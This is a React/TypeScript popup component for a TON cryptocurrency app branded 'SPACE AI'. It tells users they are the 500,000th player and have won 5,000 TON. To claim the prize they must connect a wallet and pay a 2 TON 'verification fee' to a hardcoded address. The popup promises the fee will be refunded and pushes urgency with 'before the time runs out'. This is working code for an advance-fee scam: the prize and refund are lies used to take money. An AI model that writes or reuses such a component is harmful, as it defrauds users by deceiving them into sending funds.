import React, { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Gift, Wallet, X } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { useTonConnectUI } from '@tonconnect/ui-react';
import { sendTONPayment } from '@/utils/ton';
import { tonService } from '@/services/tonService';

interface Reward5000PopupProps {
  isOpen: boolean;
  onClose: () => void;
}

const Reward5000Popup: React.FC<Reward5000PopupProps> = ({ isOpen, onClose }) => {
  const { toast } = useToast();
  const [tonConnectUI] = useTonConnectUI();
  const [claimed, setClaimed] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);

  const isWalletConnected = !!tonConnectUI.wallet;

  const handleConnectWallet = async () => {
    setIsConnecting(true);
    try {
      await tonConnectUI.openModal();
      toast({
        title: "Opening Connection",
        description: "Please select your wallet",
      });
    } catch (error) {
      console.error('Error connecting wallet:', error);
      toast({
        title: "Connection Error",
        description: "Failed to connect wallet",
        variant: "destructive"
      });
    } finally {
      setIsConnecting(false);
    }
  };

  const handlePayVerificationFee = async () => {
    if (!isWalletConnected) {
      toast({
        title: "Wallet Not Connected",
        description: "Please connect your wallet first",
        variant: "destructive"
      });
      return;
    }

    setIsProcessing(true);
    try {
      console.log('Sending 2 TON verification payment...');
      const targetAddress = "UQCiVNm22dMF9S3YsHPcgrmqXEQHt4MIdk_N7VJu88NrLr4R";
      const result = await sendTONPayment(tonConnectUI, targetAddress, 2);
      
      console.log('TON payment successful:', result);
      
      // Save transaction to local wallet history
      if (result && result.boc) {
        // Extract transaction hash from result
        const txHash = result.boc ? `reward_${Date.now()}` : 'unknown_hash';
        await tonService.saveTransaction(
          txHash,
          '2.0',
          targetAddress,
          '5000 TON Reward Verification Fee'
        );
        console.log('Transaction saved to wallet history');
      }
      
      setClaimed(true);
      
      toast({
        title: "Payment Successful!",
        description: "Transaction saved to wallet history. You will receive 5000 TON after verification.",
      });
      
    } catch (error) {
      console.error('Payment failed:', error);
      toast({
        title: "Payment Failed",
        description: "An error occurred during payment",
        variant: "destructive"
      });
    } finally {
      setIsProcessing(false);
    }
  };

  const handleClaim = () => {
    if (!isWalletConnected) {
      handleConnectWallet();
      return;
    }
    
    handlePayVerificationFee();
  };

  const handleBackdropClick = (e: React.MouseEvent) => {
    if (e.target === e.currentTarget) {
      onClose();
    }
  };

  const handleCancel = () => {
    console.log('Cancel button clicked - closing popup');
    onClose();
  };

  useEffect(() => {
    const handleEscapeKey = (event: KeyboardEvent) => {
      if (event.key === 'Escape' && isOpen) {
        onClose();
      }
    };

    if (isOpen) {
      document.addEventListener('keydown', handleEscapeKey);
    }

    return () => {
      document.removeEventListener('keydown', handleEscapeKey);
    };
  }, [isOpen, onClose]);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4" onClick={handleBackdropClick}>
      <div className="glass-button bg-black/90 backdrop-blur-xl border border-white/10 rounded-xl p-3 max-w-sm w-full shadow-2xl relative" onClick={(e) => e.stopPropagation()}>
        {/* Close button */}
        <button
          onClick={handleCancel}
          className="absolute top-2 right-2 text-white/70 hover:text-white transition-colors"
        >
          <X className="w-4 h-4" />
        </button>

        {/* Content */}
        <div className="text-center space-y-3">
          {/* Gift icon */}
          <div className="mx-auto w-10 h-10 bg-gradient-to-br from-yellow-400 to-orange-500 rounded-full flex items-center justify-center shadow-lg">
            <Gift className="w-5 h-5 text-white" />
          </div>

          {/* Title */}
          <h2 className="text-lg font-bold text-white">Congratulations from SPACE AI!</h2>

          {/* Message */}
          <div className="text-white/90 text-xs leading-relaxed space-y-2">
            <p>You've been selected to receive a special reward of <strong className="text-yellow-400">5,000 TON</strong> as we celebrate reaching 500,000 players on our platform!</p>
            
            <p>You are officially the 500,000th player, which makes you eligible for this exclusive prize.</p>
            
            <p>Before we can send your reward, we need to verify that you're a real user and not a bot. To do so, a small verification fee of <strong>2 TON</strong> is required.</p>
            
            <div className="glass-button bg-white/5 backdrop-blur-lg rounded-md p-2 border border-white/10">
              <p className="text-xs text-white/80">Note: This fee is not a charge — it's a temporary security step and will be fully refunded along with your reward after verification is complete.</p>
            </div>
            
            <p className="text-yellow-300">Hurry! Complete the verification now to confirm your identity and claim your reward before the time runs out.</p>
            
            <p className="text-white/70 text-xs">Powered by Space AI – where real players always win.</p>
          </div>

          {/* Action buttons */}
          <div className="pt-1">
            {!isWalletConnected ? (
              <Button
                onClick={handleConnectWallet}
                disabled={isConnecting}
                variant="glass-blue"
                className="w-full py-2 text-xs font-semibold"
                size="sm"
              >
                <Wallet className="w-4 h-4 mr-2" />
                {isConnecting ? 'Connecting...' : 'Connect Wallet'}
              </Button>
            ) : (
              <Button
                onClick={handleClaim}
                disabled={claimed || isProcessing}
                variant={claimed ? "glass-green" : "glass-cyan"}
                className="w-full py-2 text-xs font-semibold"
                size="sm"
              >
                {isProcessing ? 'Processing...' : claimed ? '✓ Success!' : 'Pay 2 TON Verification Fee'}
              </Button>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default Reward5000Popup;